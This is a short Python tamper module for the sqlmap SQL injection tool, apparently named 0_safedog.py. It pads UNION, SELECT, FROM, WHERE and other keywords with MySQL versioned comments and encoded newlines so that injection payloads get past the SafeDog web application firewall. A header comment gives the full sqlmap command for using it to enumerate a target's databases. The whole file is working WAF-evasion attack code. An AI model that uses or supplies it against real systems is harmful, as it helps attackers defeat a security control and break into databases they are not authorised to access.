#!/usr/bin/env python

# sqlmap.py -u http://<HOST>:<PORT>/?id=1 --batch --purge --random-agent --technique=U --no-cast --tamper=0_safedog.py --dbs

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    if payload:
        payload = payload.replace("UNION", "UNION/*!88888xxx*/%23%0a")
        payload = payload.replace("SELECT", "SELECT/*!88888xxx*/%23%0a")
        payload = payload.replace("FROM", "FROM/*!88888xxx*/%23%0a")
        payload = payload.replace("ORDER", "ORDER/*!88888xxx*/%23%0a")
        payload = payload.replace("WHERE", "WHERE/*!88888xxx*/%23%0a")
        payload = payload.replace("AND", "AND/*!88888xxx*/%23%0a")
        payload = payload.replace("USER", "USER(/*!88888xxx*/%23%0a)")
        payload = payload.replace("DATABASE", "DATABASE(/*!88888xxx*/%23%0a)")

    return payload
